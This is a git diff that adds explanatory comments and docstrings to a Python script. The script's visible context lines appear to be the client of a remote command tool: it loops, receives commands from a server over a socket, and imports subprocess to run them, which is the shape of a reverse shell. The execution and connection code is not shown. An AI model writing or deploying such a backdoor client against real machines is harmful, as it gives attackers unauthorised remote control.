@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
-import os
-import time
-import socket
-import subprocess
+import os               #It's module for work OS
+import time             #It's module for work time
+import socket           #It's module for work socket
+import subprocess       #It's module for work sys.command
 
 while True:
     while True:
@@ -17,17 +18,20 @@ while True:
 
 
     def get_data():
+        '''It's function for get information from server and decode'''
         data = client.recv(10240).decode()
         data = data.split()
         return data
 
 
     def send_data(data):
+        '''It's function for send information to server'''
         data = data.encode()
         client.send(data)
 
 
     def main():
+        '''It's function for call function and data processing'''
         while True:
             command = get_data()
             print(command)
